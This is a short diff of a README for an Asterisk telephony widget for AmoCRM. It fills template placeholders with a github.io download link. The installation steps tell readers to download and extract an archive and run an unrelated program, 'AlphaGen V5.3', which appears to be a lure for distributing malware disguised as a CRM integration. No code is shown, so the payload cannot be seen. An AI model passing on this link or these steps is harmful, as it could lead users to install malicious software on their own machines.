@@ -2,13 +2,13 @@
 
 Integrate your Asterisk PBX with AmoCRM to track calls, log recordings, and manage telephony tasks directly inside your CRM interface.
 
-[![Download](https://img.shields.io/badge/Download-Asterisk_Widget_AmoCRM-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Asterisk_Widget_AmoCRM-blueviolet)](https://asterisk-widget-amocrm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://asterisk-widget-amocrm.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate the Asterisk telephony module  
 4. ✅ In AmoCRM, go to `Settings > Integrations > Asterisk`, configure IP and extensions, and map users
